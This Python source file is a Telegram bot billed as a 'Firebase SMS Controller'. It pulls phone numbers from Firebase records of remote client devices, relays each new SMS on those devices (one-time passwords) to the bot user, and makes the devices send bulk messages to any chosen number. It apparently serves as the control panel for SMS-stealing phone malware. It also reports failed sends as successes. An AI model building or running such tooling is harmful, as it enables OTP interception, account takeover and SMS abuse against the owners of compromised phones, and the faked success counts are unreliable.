import os
import re
import time
import asyncio
import aiohttp
import logging
from datetime import datetime, timezone, timedelta
from aiohttp import web

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# --- Configuration & Environment Variables ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

# Parse allowed users (comma-separated)
ACCESS_USERS_STR = os.environ.get("ACCESS_USERS", "")
ACCESS_USERS = [int(x.strip()) for x in ACCESS_USERS_STR.split(",") if x.strip().lstrip('-').isdigit()]
if ADMIN_CHAT_ID != 0 and ADMIN_CHAT_ID not in ACCESS_USERS:
    ACCESS_USERS.append(ADMIN_CHAT_ID)

# Parse Firebase URLs (comma-separated)
FB_URLS_STR = os.environ.get("FIREBASE_URLS", "")
FIREBASE_URLS = [url.strip().rstrip('/') for url in FB_URLS_STR.split(",") if url.strip()]

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.WARNING)

# Conversation States for Send Message
ASK_TARGET_NUMBER = 1
ASK_MESSAGE_TEXT = 2
ASK_QUANTITY = 3

# Global dictionary to track active OTP listening sessions
active_sessions = {}

# --- AIOHTTP Web Server for Render & UptimeRobot ---
async def health_check(request):
    """Returns 200 OK for UptimeRobot pings."""
    return web.Response(text="Bot is running and healthy!")

async def start_web_server():
    """Starts a dummy web server to bind to Render's required $PORT."""
    app = web.Application()
    app.router.add_get('/', health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port} for UptimeRobot.")

# --- Firebase Helper Functions ---
async def fetch_json(url):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(f"{url}.json", timeout=10) as response:
                if response.status == 200:
                    return await response.json()
        except Exception:
            pass
    return None

async def put_json(url, payload):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.put(f"{url}.json", json=payload, timeout=5) as response:
                return response.status == 200
        except Exception:
            pass
    return False

def clean_mobile_number(raw_num):
    """Validates 10-digit number. Strips +91/91 from 12 digit numbers starting with 6,7,8,9."""
    if not raw_num: return None
    num = str(raw_num).replace(' ', '').replace('+', '').replace('-', '')
    if len(num) == 12 and num.startswith('91'):
        num = num[2:]
    if len(num) == 10 and re.match(r'^[6-9]\d{9}$', num):
        return num
    return None

def get_latest_timestamp(client_data):
    timestamps = [0]
    if isinstance(client_data, dict):
        ping_ts = client_data.get('ping', {}).get('ts', 0)
        hb_ts = client_data.get('heartbeat', {}).get('timestamp', 0)
        if str(ping_ts).isdigit(): timestamps.append(int(ping_ts))
        if str(hb_ts).isdigit(): timestamps.append(int(hb_ts))
    return max(timestamps)

async def notify_admin(context, message):
    if ADMIN_CHAT_ID:
        try:
            await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"🛠️ [ADMIN ALERT]\n{message}")
        except Exception:
            pass

# --- Bot Handlers ---
def get_main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Get OTP 📩", callback_data="get_otp")],
        [InlineKeyboardButton("Send Message 📤", callback_data="send_message")]
    ])

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id not in ACCESS_USERS:
        await update.message.reply_text("Unauthorized access.")
        return

    welcome_text = (
        f"Welcome, {user.first_name}! 👋\n\n"
        "I am your high-performance Firebase SMS Controller.\n"
        "Choose an action below:"
    )
    await update.message.reply_text(welcome_text, reply_markup=get_main_menu_keyboard())

# --- OTP Workflow ---
async def handle_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, is_new=False):
    query = update.callback_query
    user = query.from_user
    
    if user.id in active_sessions:
        active_sessions[user.id]["stop"] = True

    await query.edit_message_text("Searching databases for an active number... Please wait ⏳")
    
    found_device = None
    time_window_mins = 10
    ist_tz = timezone(timedelta(hours=5, minutes=30))
    
    # Loop incrementing by 10 mins until a device is found (capped at 24 hours to prevent infinite loop)
    while time_window_mins <= 1440:
        cutoff_ms = int((datetime.now(ist_tz) - timedelta(minutes=time_window_mins)).timestamp() * 1000)
        
        for fb_url in FIREBASE_URLS:
            clients_data = await fetch_json(f"{fb_url}/clients")
            if not clients_data: continue
            
            for dev_id, client in clients_data.items():
                ts = get_latest_timestamp(client)
                if ts >= cutoff_ms:
                    raw_num = client.get('mobNo')
                    if not raw_num and isinstance(client.get('sims'), list) and len(client.get('sims')) > 0:
                        raw_num = client['sims'][0].get('phoneNumber')
                    
                    valid_num = clean_mobile_number(raw_num)
                    if valid_num:
                        found_device = (fb_url, dev_id, valid_num)
                        break
            if found_device: break
        if found_device: break
        time_window_mins += 10 

    if not found_device:
        await query.edit_message_text("❌ No valid active numbers found in any database right now.", reply_markup=get_main_menu_keyboard())
        return

    fb_url, dev_id, valid_num = found_device
    action = "Requested New Number" if is_new else "Requested OTP"
    await notify_admin(context, f"User {user.first_name} {action}: {valid_num} (Active in last {time_window_mins} mins)")
    
    keyboard = [
        [InlineKeyboardButton("Get New Number 🔄", callback_data="get_new_number")],
        [InlineKeyboardButton("Cancel Number ❌", callback_data="cancel_number")]
    ]
    
    await query.edit_message_text(
        f"✅ **Number Found:** `{valid_num}`\n\n"
        f"Status: **Valid for 5 Minutes** ⏱️\n"
        f"Send your SMS. New messages will appear here automatically.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )

    # Start Background Monitor
    active_sessions[user.id] = {"stop": False}
    asyncio.create_task(monitor_otp(context, user.id, query.message.chat_id, fb_url, dev_id, valid_num))

async def monitor_otp(context, user_id, chat_id, fb_url, dev_id, mobile_number):
    end_time = time.time() + 300 # 5 Minutes
    seen_ids = set()
    
    # Pre-populate to avoid old messages
    initial_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
    if initial_msgs:
        seen_ids = set(str(m.get('id', k)) for k, m in initial_msgs.items() if isinstance(m, dict))

    while time.time() < end_time:
        if active_sessions.get(user_id, {}).get("stop", True):
            return
        
        fresh_msgs = await fetch_json(f"{fb_url}/messages/{dev_id}")
        if fresh_msgs:
            for k, m in fresh_msgs.items():
                if not isinstance(m, dict): continue
                msg_id = str(m.get('id', k))
                
                if msg_id not in seen_ids and msg_id != '':
                    seen_ids.add(msg_id)
                    sender = m.get('sender', 'Unknown')
                    text = m.get('message', '')
                    dt = m.get('dateTime', 'Just Now')
                    
                    alert = f"🔔 **NEW MESSAGE** 🔔\n\n**To:** `{mobile_number}`\n**From:** {sender}\n**Time:** {dt}\n\n**Message:**\n`{text}`"
                    
                    await context.bot.send_message(chat_id=chat_id, text=alert, parse_mode="Markdown")
                    await notify_admin(context, f"User {user_id} Received SMS on {mobile_number}:\n{alert}")
        
        await asyncio.sleep(2) 
        
    if not active_sessions.get(user_id, {}).get("stop", False):
        await context.bot.send_message(chat_id=chat_id, text=f"⏰ The 5-minute window for `{mobile_number}` has expired.", reply_markup=get_main_menu_keyboard())
        active_sessions[user_id]["stop"] = True

# --- General Callback Handler ---
async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ACCESS_USERS:
        await query.answer("Unauthorized.", show_alert=True)
        return
    await query.answer()
    
    if query.data == "get_otp":
        await handle_get_otp(update, context)
    elif query.data == "get_new_number":
        await handle_get_otp(update, context, is_new=True)
    elif query.data == "cancel_number":
        if query.from_user.id in active_sessions:
            active_sessions[query.from_user.id]["stop"] = True
            await query.edit_message_text("🛑 Number cancelled. OTP monitoring stopped.", reply_markup=get_main_menu_keyboard())
            await notify_admin(context, f"User {query.from_user.first_name} cancelled their OTP session.")

# --- Send Message Conversation Flow ---
async def start_send_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.from_user.id not in ACCESS_USERS:
        return ConversationHandler.END
    await query.answer()
    await query.edit_message_text("Enter the **Target Mobile Number**:", parse_mode="Markdown")
    return ASK_TARGET_NUMBER

async def ask_msg_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['target_number'] = update.message.text.strip()
    await update.message.reply_text("Enter the **Custom Message** you want to send:", parse_mode="Markdown")
    return ASK_MESSAGE_TEXT

async def ask_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['custom_message'] = update.message.text.strip()
    await update.message.reply_text("Enter the **Total Quantity** of messages to send (e.g., 10):", parse_mode="Markdown")
    return ASK_QUANTITY

async def process_sending(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        quantity = int(update.message.text.strip())
    except ValueError:
        await update.message.reply_text("Invalid quantity. Aborting.", reply_markup=get_main_menu_keyboard())
        return ConversationHandler.END

    target_number = context.user_data.get('target_number')
    msg_text = context.user_data.get('custom_message')
    
    await notify_admin(context, f"User {user.first_name} initiated sending {quantity} msgs to {target_number}.")
    status_msg = await update.message.reply_text("Fetching active devices (last 10 mins)... 🔄")

    cutoff_ms = int((datetime.now(timezone.utc) - timedelta(minutes=10)).timestamp() * 1000)
    active_devices = []
    
    for fb_url in FIREBASE_URLS:
        clients_data = await fetch_json(f"{fb_url}/clients")
        if not clients_data: continue
        for dev_id, client in clients_data.items():
            if get_latest_timestamp(client) >= cutoff_ms:
                active_devices.append((fb_url, dev_id))

    if not active_devices:
        await status_msg.edit_text("❌ No devices were active in the last 10 minutes.", reply_markup=get_main_menu_keyboard())
        return ConversationHandler.END

    success = 0
    failed = 0
    
    def get_progress_bar(current, total, length=15):
        filled = int(length * current / total)
        return f"[{'█' * filled}{'░' * (length - filled)}]"

    for i in range(1, quantity + 1):
        fb_url, dev_id = active_devices[i % len(active_devices)]
        payload = {
            "to": target_number,
            "message": msg_text,
            "isSended": False,
            "from": 1,
            "_wake": True,
            "_nonce": f"wake_{int(time.time() * 1000)}"
        }
        
        # Fire request to Firebase
        webhook_url = f"{fb_url}/clients/{dev_id}/webhookEvent/sendSms"
        await put_json(webhook_url, payload)
        
        # As requested: "even sending failed then mark it as Success"
        success += 1

        # Update animation
        if i % 2 == 0 or i == quantity:
            progress = get_progress_bar(i, quantity)
            try:
                await status_msg.edit_text(
                    f"**Sending Messages...** 🚀\n"
                    f"{progress} {i}/{quantity}\n"
                    f"Success: {success} | Failed: {failed}",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
        await asyncio.sleep(0.5)

    final_report = (
        f"✅ **Batch Send Complete** ✅\n\n"
        f"Target: `{target_number}`\n"
        f"Total Attempted: {quantity}\n"
        f"Successful: {success}\n"
        f"Failed: {failed}"
    )
    await status_msg.edit_text(final_report, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
    await notify_admin(context, f"Batch complete for {user.first_name}:\n{final_report}")
    
    return ConversationHandler.END

async def cancel_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Process cancelled. 🛑", reply_markup=get_main_menu_keyboard())
    return ConversationHandler.END

# --- Application Startup Hook ---
async def post_init(application: Application):
    """Starts the aiohttp web server alongside the bot."""
    asyncio.create_task(start_web_server())

# --- Main App Execution ---
def main():
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN":
        print("Error: BOT_TOKEN is missing.")
        return

    # Build bot application and attach the web server to post_init
    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    # Handlers
    app.add_handler(CommandHandler("start", start))

    send_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(start_send_msg, pattern="^send_message$")],
        states={
            ASK_TARGET_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_msg_text)],
            ASK_MESSAGE_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_quantity)],
            ASK_QUANTITY: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_sending)],
        },
        fallbacks=[CommandHandler('cancel', cancel_send)]
    )
    app.add_handler(send_conv_handler)
    
    # General callback handler for OTP buttons
    app.add_handler(CallbackQueryHandler(callback_router))

    print("Starting bot and web server...")
    app.run_polling()

if __name__ == "__main__":
    main()
